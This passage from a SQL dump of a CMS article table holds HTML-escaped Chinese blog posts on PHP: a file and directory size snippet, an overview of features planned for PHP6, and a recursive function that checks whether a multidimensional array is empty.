style=&quot;color:black;&quot;&gt;&amp;nbsp;null;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;is_file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;))&amp;nbsp;{&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//文件;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$f&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''size''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;-&amp;gt;tosize(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;filesize&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;)&amp;nbsp;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;else&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;is_dir&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;))&amp;nbsp;{&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//目录&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$f&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''size''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;-&amp;gt;tosize(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;-&amp;gt;dirsize&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;));&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$f&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''ctime''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;date&lt;/span&gt;&lt;s', 1, 1, 0, 0, 1302426690, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(39, 1, 'PHP6简介', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:arial, sans-serif, helvetica, tahoma;&quot;&gt;&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;1、&lt;strong style=&quot;font-weight:bold;&quot;&gt;支持Unicode&lt;/strong&gt;。Unicode是有其必然，虽然Unicode占用较多的空间，但Unicode带来的便利性，远超过占用空间的缺点，尤其在国际化的今天，硬件设备越来越强大，网速也大幅度的提升，这么一点小小的缺点是可以忽略的。另外一点，PHP也可以在.ini文件中设定能不能开启支持Unicode，决定权在你自己，这是一个不错的点子，关掉Unicode的支持，PHP的性能并不会有大幅度的提升，主要的影响在于需要引用字符串的函数。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　2、&lt;strong style=&quot;font-weight:bold;&quot;&gt;Register Globals 将被移除&lt;/strong&gt;&amp;nbsp;这是一个主要的决定，老的PHP使用者会觉得Register Globals满方便的，但是却忽略了Register Globals会带来程序上安全性的隐患，大多数的主机上此项功能是关闭的，印象中从PHP4.3.x版开始，此项默认配置值即是关闭状态，PHP6正式移除Register Globals也代表着如果程序是PHP3时代的产物，将完全不能运用，除了改写用途外，别无他法。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　3、&lt;strong style=&quot;font-weight:bold;&quot;&gt;Magic Quotes 将取消&amp;nbsp;&lt;/strong&gt;Magic Quotes主要是自动转义须要转义的字符，此项功能移除也符合大多数PHP开发者的心声。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　4、&lt;strong style=&quot;font-weight:bold;&quot;&gt;Safe Mode 取消&lt;/strong&gt;。老实说，这个模式不知道哪里不好，取消就取消吧，反正也用不到。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　5、&lt;strong style=&quot;font-weight:bold;&quot;&gt;’var’ 别名为 ‘public’&lt;/strong&gt;，在类中的var声明变成public的别名，相信是为了兼容PHP5而作的决定，PHP6现在也可以称作为OO语言了。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　6、&lt;strong style=&quot;font-weight:bold;&quot;&gt;通过引用返回将出错&lt;/strong&gt;&amp;nbsp;未来通过引用返回编译器将会报错 例如$a =&amp;amp; new b()、function &amp;amp;c()，OO语言默认就是引用，所以不须要再运用 &amp;amp;了。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　7、&lt;strong style=&quot;font-weight:bold;&quot;&gt;zend.ze1 compatbility mode 将被移去&lt;/strong&gt;（Zend.ze1相容模式将被移去），PHP5是为兼容旧有PHP4，所以在.ini中可选择是否开启相容模式，原由在于PHP5运用的是第二代分析引擎，但是相容模式并不是百分之百能分析 PHP4语法，所以旧时代的产物，移除。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　8、&lt;strong style=&quot;font-weight:bold;&quot;&gt;Freetype 1 and GD 1 support 将不见&amp;nbsp;&lt;/strong&gt;这两个Libs存在了很久，php6将不再支持，况且GD1早已被现在的GD2取代了。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　9、&lt;strong style=&quot;font-weight:bold;&quot;&gt;dl() 被移到 SAPI 中dl()主要是让设计师加载extension Libs&lt;/strong&gt;，现在被移到 SAPI 中。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　10、&lt;strong style=&quot;font-weight:bold;&quot;&gt;Register Long Array 去除 从PHP5起默认是关闭&lt;/strong&gt;，在PHP6中正式移除。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　11、&lt;strong style=&quot;font-weight:bold;&quot;&gt;一些Extension的变更例如 XMLReader 和 XMLWriter 将不再是以Extension的方式出现&lt;/strong&gt;，他们将被移入到PHP的核心之中，并且默认是开启，ereg extension将被放入PECL，代表着它将被移出PHP核心，这也是为了让路给新的正则表达式extension，此外，Fileinfo extension 也将被导入PHP的核心之中。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　12、&lt;strong style=&quot;font-weight:bold;&quot;&gt;APC将被导入核心&lt;/strong&gt;&amp;nbsp;这是一个提高PHP性能的功能，现在它将被放入PHP核心中，并且可以选择是否启用APC。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;　　13、&lt;strong style=&quot;font-weight:bold;&quot;&gt;告别ASP风格的起始标签&lt;/strong&gt;&amp;nbsp;原来是为了取悦ASP开发者转向运用 PHP，现今已经不再须要这种做法了。&lt;/p&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302426977, 1, 'admin'),
(40, 1, 'PHP判断数组（多维数组）值是否为空', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:arial, sans-serif, helvetica, tahoma;&quot;&gt;PHP判断单值是否为空使用最为常用的empty即可，但是，在判断有键值的数组或多维数组时就会出现困难，以下就是PHP中判断数组（多维）数值是否为空的函数：&amp;nbsp;&lt;br /&gt;\r\n&lt;div class=&quot;dp-highlighter&quot; id=&quot;&quot; style=&quot;font-family:monaco, ''dejavu sans mono'', ''bitstream vera sans mono'', consolas, ''courier new'', monospace;font-size:12px;background-color:transparent;width:694px;overflow-x:auto;overflow-y:auto;margin-left:9px;padding-top:1px;padding-right:1px;padding-bottom:1px;padding-left:1px;word-break:break-all;word-wrap:break-word;&quot;&gt;&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;tools&quot; style=&quot;padding-top:3px;padding-right:3px;padding-bottom:3px;padding-left:3px;text-align:left;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;color:black;font-weight:bold;&quot;&gt;Php代码&amp;nbsp;&lt;embed src=&quot;http://lesorb.iteye.com/javascripts/syntaxhighlighter/clipboard_new.swf&quot; width=&quot;14&quot; height=&quot;15&quot; flashvars=&quot;clipboard=class%20Test%7B%0Apublic%20static%20function%20array_is_null(%24arr%20%3D%20null)%7B%0A%09%09if(is_array(%24arr))%7B%0A%09%09%20%20%20foreach(%24arr%20as%20%24k%3D%3E%24v)%7B%0A%09%09%09if(%24v%26%26!is_array(%24v))%7B%0A%09%09%09%20%20%20%20return%20false%3B%0A%09%09%09%7D%0A%09%09%09%20%20%20%24t%20%3D%20self%3A%3Aarray_is_null(%24v)%3B%0A%09%09%09if(!%24t)%7B%0A%09%09%09%20%20%20%20return%20false%3B%0A%09%09%09%7D%0A%09%09%20%20%20%20%7D%0A%09%09%09return%20true%3B%0A%09%09%7Delseif(!%24arr)%7B%0A%09%09%09return%20true%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7Delse%7B%0A%09%09%09return%20false%3B%0A%09%09%7D%0A%09%7D%0A%7D&quot; quality=&quot;high&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&amp;nbsp;&lt;a href=&quot;http://lesorb.iteye.com/blog/982499&quot; title=&quot;收藏这段代码&quot; style=&quot;color:#006600;text-decoration:underline;&quot;&gt;&lt;img class=&quot;star&quot; src=&quot;http://lesorb.iteye.com/images/icon_star.png&quot; alt=&quot;收藏代码&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;font-size:1em;line-height:1.4em;margin-top:0px;margin-right:0px;margin-bottom:1px;margin-left:0px;padding-top:2px;padding-right:0px;padding-bottom:2px;padding-left:0px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:#d1d7dc;border-right-color:#d1d7dc;border-bottom-color:#d1d7dc;border-left-color:#d1d7dc;list-style-type:decimal;list-style-position:initial;list-style-image:initial;background-color:#ffffff;color:#2b91af;&quot;&gt;&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;class&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;Test{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;public&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;static&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;array_is_null(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;null){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;is_array&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;foreach&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;as&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$k&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$v&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$v&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;amp;&amp;amp;!&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;is_array&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$v&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;false;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$t&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;self::array_is_null(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$v&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$t&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li 